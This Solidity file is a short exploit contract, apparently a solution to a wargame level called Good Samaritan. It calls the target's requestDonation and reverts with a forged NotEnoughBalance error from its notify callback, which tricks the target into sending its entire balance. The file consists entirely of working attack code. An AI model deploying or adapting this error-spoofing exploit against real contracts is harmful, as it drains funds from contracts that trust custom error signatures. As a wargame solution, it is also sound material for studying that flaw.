// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.1;

// interface to call target function
interface IGoodSamaritan {
  function requestDonation() external returns (bool enoughBalance);
} 

contract Attack {  
  // error signature will be taken from here
  error NotEnoughBalance();

  // entry point for our attack, simply requests a donation
  function attack(address _addr) external { 
     IGoodSamaritan(_addr).requestDonation();
  }

  // notify is called when this contract receives coins 
  function notify(uint256 amount) external pure {
    if(amount <= 10){
      revert NotEnoughBalance();
    }  
  }
}